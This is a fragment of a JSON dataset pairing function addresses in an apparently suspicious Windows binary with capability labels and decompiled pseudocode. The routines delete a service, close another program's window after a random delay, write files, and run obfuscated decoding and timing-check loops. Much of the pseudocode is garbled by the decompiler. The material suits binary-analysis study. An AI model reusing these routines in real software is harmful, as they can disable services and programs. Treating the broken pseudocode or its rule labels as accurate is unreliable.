        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004015a0(uint arg_8h, uint arg_ch)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    uint var_4h;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    fcn.00403880(hSCManager, arg_8h);\n    uVar1 = fcn.00403c10(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 141
    },
    "00401bf0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f44) overlaps instruction at (ram,0x00401f42)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401bf0(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint8_t extraout_CH;\n    uint16_t extraout_CX;\n    int16_t extraout_CX_00;\n    char extraout_CH_00;\n    char cVar3;\n    uint extraout_ECX;\n    int32_t extraout_EDX;\n    int32_t iVar4;\n    char *unaff_EBX;\n    uint unaff_EBP;\n    uint *unaff_ESI;\n    ushort in_SS;\n    uchar uVar5;\n    bool bVar6;\n    bool bVar7;\n    uchar uVar8;\n    ulong uVar9;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t iStack48;\n    uint *puStack44;\n    uint uStack40;\n    uint uStack36;\n    char **ppcStack32;\n    ushort uStack28;\n    ushort uStack26;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack20;\n    ushort uStack18;\n    char *pcVar10;\n    \n    uStack20 = 0x7010;\n    uStack18 = 0x40;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    ppcStack32 = 0x401c1b;\n    pcVar10 = unaff_EBX;\n    fcn.00402280();\n    uStack20 = 0x722c;\n    uStack18 = 0x40;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    ppcStack32 = 0x401c4d;\n    fcn.00402280();\n    bVar6 = (extraout_CH | 0x47) == 0;\n    uStack20 = 0x723c;\n    uStack18 = 0x40;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    ppcStack32 = 0x401c6e;\n    fcn.00402280();\n    if ((bVar6) || (ppcStack32 = ppcStack32 & 0xffff | extraout_CX << 0x10,  !bVar6)) {\n        ppcStack32 = 0xa;\n    }\n    uStack36 = 0x47;\n    uStack40 = 0x407290;\n    puStack44 = 0xf;\n    iStack48 = 0x407490;\n    uStack52 = 0x401c92;\n    fcn.00402280();\n    uStack20 = 0xb;\n    uStack18 = 0;\n    uStack24 = 0x729c;\n    uStack22 = 0x40;\n    uStack28 = 0xf;\n    uStack26 = 0;\n    ppcStack32 = 0x407490;\n    uStack36 = 0x401cb0;\n    fcn.00402280();\n    uStack20 = 8;\n    uStack18 = 0;\n    uStack24 = 0x72a8;\n    uStack22 = 0x40;\n    uStack28 = 0xf;\n    uStack26 = 0;\n    ppcStack32 = 0x407490;\n    uStack36 = 0x401cd9;\n    fcn.00402280();\n    uStack20 = 9;\n    uStack18 = 0;\n    uStack24 = 0x72b0;\n    uStack22 = 0x40;\n    uStack28 = 0xf;\n    uStack26 = 0;\n    ppcStack32 = 0x407490;\n    uStack36 = 0x401cfb;\n    fcn.00402280();\n    bVar6 = false;\n    bVar7 = (unaff_EBX & 0xffff) == extraout_CX_00;\n    uStack20 = 9;\n    uStack18 = 0;\n    uStack24 = 0x72bc;\n    uStack22 = 0x40;\n    uStack28 = 0xf;\n    uStack26 = 0;\n    ppcStack32 = 0x407490;\n    uStack36 = 0x401d1e;\n    fcn.00402280();\n    if ((!bVar6 && !bVar7) && (bVar6 || bVar7)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uStack36 = 9;\n    uStack40 = 0x4072c8;\n    puStack44 = 0xf;\n    iStack48 = 0x407490;\n    uStack52 = 0x401d3b;\n    fcn.00402280();\n    bVar6 = false;\n    uStack20 = 0xc;\n    uStack18 = 0;\n    uStack24 = 0x72d4;\n    uStack22 = 0x40;\n    uStack28 = 0xf;\n    uStack26 = 0;\n    ppcStack32 = 0x407490;\n    uStack36 = 0x401d76;\n    fcn.00402280();\n    if ((!bVar6) && (bVar6)) {\n        *ppcStack32 = pcVar10;\n        return;\n    }\n    uStack36 = 3;\n    uStack40 = 0x4072e0;\n    puStack44 = 0xf;\n    iStack48 = 0x407490;\n    uStack52 = 0x401da9;\n    fcn.00402280();\n    uVar5 = 0;\n    uVar8 = (unaff_EBX & 0xffff) >> 8 == '\\0';\n    uStack20 = 10;\n    uStack18 = 0;\n    uStack24 = 0x72e4;\n    uStack22 = 0x40;\n    uStack28 = 0xf;\n    uStack26 = 0;\n    ppcStack32 = 0x407490;\n    uStack36 = 0x401dce;\n    fcn.00402280();\n    uStack36 = 0x40;\n    uStack40 = 0x4072f0;\n    puStack44 = 0xf;\n    iStack48 = 0x407490;\n    uStack52 = 0x401df3;\n    fcn.00402280();\n    if ((uVar5 || uVar8) || (!uVar5 && !uVar8)) {\n        uStack52 = 0xc;\n        uStack56 = 0x407330;\n        uStack60 = 0xf;\n    }\n    cVar3 = *unaff_EBX;\n    piVar1 = CONCAT22(uStack36._2_2_, in_SS) + 0x6a;\n    *piVar1 = *piVar1 - &stack0xffffffc4;\n    unaff_EBX[0x40] = unaff_EBX[0x40] ^ extraout_EDX >> 8;\n    *(extraout_EDX + 0xf) = *(extraout_EDX + 0xf) + (extraout_CH_00 - cVar3);\n    fcn.00402280(0x407490);\n    uStack20 = 0xb;\n    uStack18 = 0;\n    uStack24 = 0x733c;\n    uStack22 = 0x40;\n    uStack28 = 0xf;\n    uStack26 = 0;\n    ppcStack32 = 0x407490;\n    uStack36 = 0x401e35;\n    fcn.00402280();\n    uStack20 = 4;\n    uStack18 = 0;\n    uStack24 = 0x7348;\n    uStack22 = 0x40;\n    uStack28 = 0xf;\n    uStack26 = 0;\n    ppcStack32 = 0x407490;\n    uStack36 = 0x401e56;\n    fcn.00402280();\n    uStack20 = 4;\n    uStack18 = 0;\n    uStack24 = 0x734c;\n    uStack22 = 0x40;\n    uStack28 = 0xf;\n    uStack26 = 0;\n    ppcStack32 = 0x407490;\n    uStack36 = 0x401e7b;\n    fcn.00402280();\n    uStack20 = 0xc;\n    uStack18 = 0;\n    uStack24 = 0x7350;\n    uStack22 = 0x40;\n    uStack28 = 0xf;\n    uStack26 = 0;\n    ppcStack32 = 0x407490;\n    uStack36 = 0x401e96;\n    fcn.00402280();\n    uStack20 = 4;\n    uStack18 = 0;\n    uStack24 = 0x735c;\n    uStack22 = 0x40;\n    uStack28 = 0xf;\n    uStack26 = 0;\n    ppcStack32 = 0x407490;\n    uStack36 = 0x401ebc;\n    iStack48 = CONCAT22(uStack36._2_2_, in_SS);\n    puStack44 = unaff_ESI;\n    uStack40 = unaff_EBP;\n    fcn.00402280();\n    bVar6 = false;\n    bVar7 = false;\n    uStack20 = 9;\n    uStack18 = 0;\n    uStack24 = 0x7360;\n    uStack22 = 0x40;\n    uStack28 = 0xf;\n    uStack26 = 0;\n    ppcStack32 = 0x407490;\n    uStack36 = 0x401ef0;\n    uVar9 = fcn.00402280();\n    iVar4 = uVar9 >> 0x20;\n    cVar3 = extraout_ECX >> 8;\n    if ((bVar7) || (!bVar7)) {\n        uStack36 = 0x16;\n        uStack40 = 0x40736c;\n        puStack44 = 0xf;\n    }\n    else {\n        puVar2 = uVar9 + 1;\n        *CONCAT22(uStack36._2_2_, in_SS) = *unaff_ESI;\n        iVar4 = 0x6c68166a;\n        uStack36 = extraout_ECX;\n        if (!bVar6) {\n            unaff_EBX[0x5e5f30c4] = unaff_EBX[0x5e5f30c4] + puVar2 + *puVar2;\n            return;\n        }\n    }\n    pcVar10 = iVar4 + 0xf;\n    bVar6 = SCARRY1(*pcVar10, cVar3);\n    *pcVar10 = *pcVar10 + cVar3;\n    iStack48 = 0x407490;\n    uStack52 = 0x401f11;\n    fcn.00402280();\n    if ((!bVar6) && (bVar6)) {\n        LOCK();\n    }\n    uStack52 = 7;\n    uStack56 = 0x407384;\n    uStack60 = 0xf;\n    fcn.00402280(0x407490);\n    return;\n}\n",
        "token_count": 2613
    },
    "00402280": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004022ff) overlaps instruction at (ram,0x004022fa)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint32_t __fastcall\nfcn.00402280(uchar *param_1, char *param_2, uint param_3, uint param_4, uchar *param_5, uint32_t param_6)\n\n{\n    uint32_t *puVar1;\n    uchar uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint32_t unaff_EBX;\n    uint *puVar7;\n    uchar *puVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    bool bVar11;\n    bool bVar12;\n    bool bVar13;\n    ushort uStack18;\n    \n    puVar8 = &stack0xfffffffc;\n    uVar9 = 0;\n    bVar10 = false;\n    bVar13 = false;\n    bVar12 = param_6 < 0;\n    bVar11 = param_6 == 0;\n    if (0 < param_6) {\n        do {\n            if ((bVar13) || (uStack18 = SUB42(param_2, 0),  !bVar13)) {\n                param_1 = param_1 & 0xffffff00 | param_5[uVar9];\n                if (!bVar11 && bVar13 == bVar12) goto code_r0x004022be;\ncode_r0x004022c7:\n                param_6 = uVar9;\n            }\n            else {\n                uVar2 = in(uStack18);\n                *param_5 = uVar2;\n                if (!bVar10 && !bVar11) {\n                    if (bVar13 == bVar12) {\n                        iVar4 = param_1 << 0x10;\n                        param_1 = param_1 & 0xffff;\n                        uVar5 = iVar4 >> 0x18;\n                        if (bVar13 != bVar12) goto code_r0x00402335;\n                    }\n                    uVar5 = param_1 >> 8;\ncode_r0x00402335:\n                    puVar7 = &stack0xfffffff0 ^ *(CONCAT31(unaff_EBX >> 8, 0xbc) + -0x75);\n                    param_2[1] = param_2[1] | uVar5;\n                    puVar7[-1] = uVar9;\n                    puVar7[-2] = 0x402343;\n                    iVar4 = fcn.00401000(puVar7[-1], *puVar7);\n                    return iVar4 != 0;\n                }\n                unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(*param_1, 0xbc);\n                bVar13 = false;\n                param_6 = 0x7e3e0cee;\n                bVar12 = true;\n                bVar11 = false;\n                param_5 = param_5 + 1;\ncode_r0x004022be:\n                if (!bVar11 && bVar13 == bVar12) goto code_r0x004022c7;\n            }\n            uVar6 = param_6 % *(puVar8 + 0xc);\n            param_2 = *(puVar8 + 8);\n            uVar5 = param_1 ^ param_2[uVar6];\n            uVar3 = param_1 & 0xffffff00;\n            param_1 = uVar3 | uVar5;\n            bVar10 = (POPCOUNT(((unaff_EBX ^ 0x70c5) - param_2 >> 8 | uVar3 >> 8) - uVar5) & 1U) == 0;\n            if ((bVar10) || (!bVar10)) {\n                param_6 = *(puVar8 + 0x14);\n                uVar5 = param_6 ^ uVar5;\n                param_2 = uVar6 & 0xffffff00 | uVar5;\n                param_5[uVar9] = uVar5;\n                uVar9 = uVar9 + 1;\n                bVar10 = uVar9 < param_6;\n                bVar13 = SBORROW4(uVar9, param_6);\n                bVar12 = uVar9 - param_6 < 0;\n                bVar11 = uVar9 == param_6;\n            }\n            else {\n                uVar9 = 0x34a96cf4;\n                puVar8 = *0x8b17b43a + 1;\n                param_6 = uVar6 + 1 & 0xffffff00 | uVar6 + 1 + 0x8a;\n                *param_2 = *param_2 << 1;\n                bVar12 = *param_2 < '\\0';\n                bVar11 = *param_2 == '\\0';\n                puVar1 = param_6 + 0x3b463e14;\n                bVar10 = (*puVar1 & 1) != 0;\n                *puVar1 = *puVar1 >> 1 | bVar10 << 0x1f;\n                bVar13 = ((*puVar1 & 0x40000000) != 0) != *puVar1 < 0;\n                LOCK();\n            }\n        } while (bVar13 != bVar12);\n    }\n    return param_6;\n}\n",
        "token_count": 1203
    },
    "00402710": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402710(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.00401510(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 105
    },
    "00402b80": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402d7a) overlaps instruction at (ram,0x00402d77)\n// \n// WARNING: Removing unreachable block (ram,0x00402ceb)\n// WARNING: Removing unreachable block (ram,0x00402bed)\n// WARNING: Removing unreachable block (ram,0x00402bf7)\n// WARNING: Removing unreachable block (ram,0x00402bfb)\n// WARNING: Removing unreachable block (ram,0x00402ded)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00402b80(uchar *arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    ushort uVar2;\n    uint16_t uVar3;\n    uint in_EAX;\n    uchar *puVar4;\n    uint uVar5;\n    uint32_t in_ECX;\n    uint32_t uVar6;\n    uint8_t uVar8;\n    uint32_t in_EDX;\n    uchar *puVar7;\n    uint8_t uVar9;\n    uint unaff_EBX;\n    uint *puVar10;\n    uint *puVar11;\n    ushort unaff_SI;\n    uchar *puVar12;\n    uchar *puVar13;\n    char *unaff_EDI;\n    char *pcVar14;\n    ushort in_ES;\n    ushort in_SS;\n    bool bVar15;\n    bool bVar16;\n    char cVar17;\n    bool bVar18;\n    uint16_t uStack38;\n    uint8_t uStack36;\n    uint8_t uStack35;\n    ushort uStack34;\n    uint8_t uStack32;\n    uchar uStack31;\n    ushort uStack30;\n    ushort uStack28;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack20;\n    ushort uStack18;\n    \n    puVar10 = &stack0xfffffffc;\n    uVar2 = in_ECX >> 0x10;\n    *arg_8h = 0x9e;\n    uStack20 = in_EDX;\n    uStack24 = in_EAX;\n    uStack22 = in_EAX >> 0x10;\n    uStack34 = in_EDX >> 0x10;\n    arg_8h[1] = 0xad;\n    arg_8h[2] = 0x2a;\n    arg_8h[3] = 0xe4;\n    uStack36 = in_ECX & 0xffff;\n    uStack35 = (in_ECX & 0xffff) >> 8;\n    uVar9 = in_EDX >> 8;\n    bVar16 = (in_EDX & 0x1200) != 0;\n    arg_8h[4] = 0x91;\n    if (((bVar16) && (!bVar16)) || (arg_8h[5] = 0xac,  puVar4 = arg_8h,  (POPCOUNT(uVar9 & 0x12) & 1U) != 0)) {\n        in_ECX = CONCAT22(unaff_SI, uStack28);\n        puVar4 = arg_8h + 0x510a7aac;\n        if ((POPCOUNT(arg_8h + 0x510a7aac & 0xff) & 1U) != 0) goto code_r0x00402c46;\n        cVar17 = SCARRY4(arg_8h, 0x40);\n        uStack32 = 0x4e;\n        uStack31 = 0x2c;\n        uStack30 = 0x40;\n        uStack28 = in_ES;\n        uStack18 = uStack20;\n        puVar4 = func_0x23a67e9f();\n        pcVar1 = swi(4);\n        puVar12 = arg_8h + 0x40;\n        uStack34 = uVar2;\n        if (cVar17 == '\\x01') {\n            puVar4 = (*pcVar1)();\n        }\n    }\n    else {\ncode_r0x00402c46:\n        puVar4[6] = 0xe8;\n        uStack32 = in_ECX;\n        uStack31 = in_ECX >> 8;\n        uStack30 = in_ECX >> 0x10;\n        uStack36 = in_EDX;\n        puVar12 = arg_8h;\n        uStack35 = uVar9;\n    }\n    puVar7 = CONCAT22(uStack34, CONCAT11(uStack35, uStack36));\n    puVar4[7] = 0xbb;\n    uStack38 = puVar12;\n    bVar16 = (POPCOUNT((uStack38 | 0x561b) - puVar7 & 0xff) & 1U) != 0;\n    puVar4[8] = 0x1e;\n    if ((bVar16) && (!bVar16)) {\ncode_r0x00402c95:\n        puVar11 = &uStack28;\n        cVar17 = '\\x1e';\n        do {\n            puVar10 = puVar10 + -1;\n            puVar11 = puVar11 + -1;\n            *puVar11 = *puVar10;\n            cVar17 = cVar17 + -1;\n        } while ('\\0' < cVar17);\n        uVar5 = in(0x78);\n        return CONCAT44(puVar7, uVar5);\n    }\n    puVar4[9] = 0x11;\n    bVar16 = uStack32 < uStack36;\n    bVar15 = (POPCOUNT(uStack32 - 1) & 1U) == 0;\n    arg_8h[10] = 0xd6;\n    puVar7 = arg_8h;\n    if (('\\0' < uStack32) && (uStack32 < '\\x01')) {\n        puVar12 = puVar12 + -1;\n        pcVar14 = unaff_EDI | &stack0xfffffffc;\n        unaff_EDI = pcVar14 + 1;\n        cVar17 = puVar4;\n        *pcVar14 = cVar17;\n        bVar16 = false;\n        puVar7 = arg_8h & 0xffffff00;\n        uVar6 = puVar4 >> 8;\n        puVar4 = NULL;\n        bVar15 = (POPCOUNT(cVar17 + uVar6 * 'y') & 1U) == 0;\n        in_SS = uStack28;\n    }\n    uVar9 = puVar4 >> 8;\n    puVar7[0xb] = 0xdc;\n    if ((!bVar15) && (bVar15)) {\n        puVar11 = segment(in_SS, *0x10 + -0x1c);\n        uVar9 = *puVar11 >> 8;\n        puVar7 = 0xb7bc9ea5;\n        if (!bVar16) {\n            if (bVar15) goto code_r0x00402c95;\n            uVar9 = *puVar11 >> 8;\n        }\n    }\n    puVar7[0xc] = 0x35;\n    uVar6 = CONCAT22(uStack30, CONCAT11(uStack31, uStack32));\n    puVar7[0xd] = 0x9e;\n    uStack35 = unaff_EBX >> 8;\n    uVar9 = uStack35 ^ 0x16 | uVar9;\n    uVar8 = puVar7 >> 8;\n    puVar7[0xe] = 0xfc;\n    if ((uVar8 < uVar9) && (uVar9 <= uVar8)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    do {\n        puVar7[0xf] = 0x46;\n        uStack32 = unaff_EDI;\n        uStack31 = unaff_EDI >> 8;\n        bVar16 = (POPCOUNT(puVar7 - 1U & uVar6 & 0xff) & 1U) == 0;\n        arg_8h[0x10] = 0xab;\n        if (bVar16) {\ncode_r0x00402d9c:\n            arg_8h[0x11] = 0x61;\n        }\n        else {\n            uStack32 = uVar6;\n            uStack31 = uVar6 >> 8;\n            if (!bVar16) goto code_r0x00402d9c;\n            bVar16 = 0xffffffbf < puVar12;\n            puVar12 = puVar12 + 0x40;\n            *(uVar6 + 0x66) = &uStack28 + bVar16 + *(uVar6 + 0x66);\n        }\n        puVar13 = puVar12 | 0x561b;\n        bVar18 = SBORROW4(puVar13, puVar7);\n        bVar15 = puVar13 - puVar7 < 0;\n        bVar16 = puVar13 == puVar7;\n        uVar6 = uVar6 & 0xffff0000 | CONCAT11(uStack31, uStack32);\n        arg_8h[0x12] = 0x7f;\n        puVar4 = arg_8h;\n        if ((puVar7 <= puVar13) && (puVar13 < puVar7)) {\n            puVar12 = puVar12 + -1;\n            pcVar14 = unaff_EDI | &stack0xfffffffc;\n            unaff_EDI = pcVar14 + 1;\n            *pcVar14 = arg_8h;\n            bVar18 = false;\n            puVar7 = puVar7 & 0xffffff00;\n            uVar3 = arg_8h + (arg_8h >> 8) * 'y';\n            puVar4 = arg_8h & 0xffff0000 | uVar3;\n            bVar15 = false;\n            bVar16 = uVar3 == 0;\n        }\n        puVar4[0x13] = 0x92;\n        if ((bVar16 || bVar18 != bVar15) || (!bVar16 && bVar18 == bVar15)) {\n            puVar4[0x14] = 0x82;\n            *arg_ch = 0x15;\n            return CONCAT44(puVar7, arg_ch);\n        }\n        if (uVar6 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        puVar12 = puVar12 + -1;\n    } while( true );\n}\n",
        "token_count": 2355
    },
    "00403880": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004038e4) overlaps instruction at (ram,0x004038e0)\n// \n\nint32_t __cdecl fcn.00403880(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char cVar3;\n    char cVar4;\n    unkbyte10 extraout_ST0;\n    ulong uVar5;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    cVar4 = '\\0';\n    cVar3 = iVar1 < 0;\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar5 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n    piVar2 = uVar5 >> 0x20;\n    if ((cVar4 == cVar3) && (cVar4 != cVar3)) {\n        *(uVar5 + -0x7ce92414) = extraout_ST0;\n        *piVar2 = *piVar2 + -0xa9207c;\n    }\n    else {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    }\n    return uVar5;\n}\n",
        "token_count": 289
    },
    "004046a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004046a0(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar4 = &var_107h;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    uVar3 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(uVar3 - 0x108, 0x4073d4);\n    if (iVar2 != 0) {\n        return 1;\n    }\n    uVar1 = *(uVar3 + 8);\n    (*_sym.imp.USER32.dll_EnumChildWindows)(uVar1, 0x404620, 0);\n    iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar2 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(uVar1, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 429
    },
    "null": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.00403bb0(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00404c90(argv),  pcVar3 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar3)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 242
    },
    "00401f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004020d0) overlaps instruction at (ram,0x004020cc)\n// \n\nvoid fcn.00401f50(void)\n\n{\n    char *pcVar1;\n    char extraout_CH;\n    char extraout_CH_00;\n    int32_t iVar2;\n    int32_t *piVar3;\n    bool bVar4;\n    char in_SF;\n    uchar uVar5;\n    char in_OF;\n    unkbyte10 extraout_ST0;\n    uint64_t uVar6;\n    ulong uVar7;\n    \n    uVar6 = fcn.00402280();\n    iVar2 = uVar6 >> 0x20;\n    if (((in_OF != in_SF) || (in_OF == in_SF)) || (iVar2 = uVar6,  uVar6 < 0xac68266a00000000)) {\n        pcVar1 = iVar2 + 0xf;\n        *pcVar1 = *pcVar1 + extraout_CH;\n        uVar5 = *pcVar1 < '\\0';\n        bVar4 = *pcVar1 == '\\0';\n        fcn.00402280(0x407490);\n        if ((!bVar4) && (bVar4)) {\n            uVar5 = &stack0xffffffd5 < 0;\n        }\n        uVar7 = fcn.00402280(0x407490, 0xf, 0xd4, 8);\n        if ((!uVar5) && (uVar5)) {\n            if (uVar7 < 0x2397e696) goto code_r0x00401ffe;\n            pcVar1 = (uVar7 >> 0x20) + 0xf;\n            *pcVar1 = *pcVar1 + extraout_CH_00;\n        }\n    }\n    fcn.00402280(0x407490);\n    fcn.00402280();\ncode_r0x00401ffe:\n    fcn.00402280();\n    fcn.00402280();\n    fcn.00402280();\n    fcn.00402280(0x90);\n    fcn.00402280(0x407490, 0xf, 0x407438, 8);\n    uVar7 = fcn.00402280();\n    piVar3 = uVar7 >> 0x20;\n    *(uVar7 + -0x7ce92414) = extraout_ST0;\n    *piVar3 = *piVar3 + 0x76adf84;\n    fcn.00402280(0x90);\n    fcn.00402280();\n    fcn.00402280();\n    fcn.00402280();\n    fcn.00402280(0x90);\n    return;\n}\n",
        "token_count": 603
    },
    "00402320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402338) overlaps instruction at (ram,0x00402336)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Could not reconcile some variable overlaps\n\nbool __fastcall fcn.00402320(ushort param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    uint *puVar2;\n    uint unaff_ESI;\n    char in_SF;\n    char in_OF;\n    uint uStack8;\n    \n    if (in_OF == in_SF) {\n        uStack8 = CONCAT22(param_1, uStack8);\n        if (in_OF != in_SF) goto code_r0x00402335;\n    }\n    uStack8 = 1;\ncode_r0x00402335:\n    puVar2 = &stack0xfffffff8 ^ *(unaff_EBX + -0x75);\n    *(param_2 + 1) = *(param_2 + 1) | param_1 >> 8;\n    puVar2[-1] = unaff_ESI;\n    puVar2[-2] = 0x402343;\n    iVar1 = fcn.00401000(puVar2[-1], *puVar2);\n    return iVar1 != 0;\n}\n",
        "token_count": 289
    },
    "00402380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402399) overlaps instruction at (ram,0x00402397)\n// \n// WARNING: Removing unreachable block (ram,0x004023b4)\n// WARNING: Removing unreachable block (ram,0x00402399)\n// WARNING: Removing unreachable block (ram,0x004023b6)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00402380(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar auStack8 [4];\n    \n    uVar1 = param_2;\n    iVar2 = fcn.004028b0(param_1, param_2, auStack8, &param_2);\n    if (iVar2 != 0) {\n        *(iVar2 + 0x58) = param_2;\n        fcn.004028b0(param_1, uVar1, auStack8, &param_2);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 231
    },
    "00402400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402400(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 131
    },
    "00403070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403070(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00402eb0(&var_68h, &var_4h);\n    fcn.00404cf0(&var_68h, var_4h, 0x411840, 0xd000);\n    *arg_8h = 0x411840;\n    *arg_ch = 0xd000;\n    return;\n}\n",
        "token_count": 237
    },
